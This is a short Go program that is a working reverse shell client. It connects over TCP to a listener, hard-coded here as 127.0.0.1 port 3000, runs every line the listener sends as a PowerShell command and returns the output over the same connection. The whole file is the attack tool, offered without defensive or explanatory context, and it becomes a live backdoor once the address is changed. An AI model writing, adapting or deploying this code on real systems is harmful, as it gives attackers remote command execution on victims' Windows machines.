package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	address := "127.0.0.1"
	port := 3000

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", address, port))
	if err != nil {
		fmt.Println("Error connecting server:", err)
		return
	}
	defer conn.Close()

	fmt.Println("[+] Connection")

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()

		if command != "" {
			cmd := exec.Command("powershell", "-Command", command)

			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println("Error:", err)
			}

			conn.Write(output)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error scan from server:", err)
	}

	fmt.Println("[-] Connection end")
}
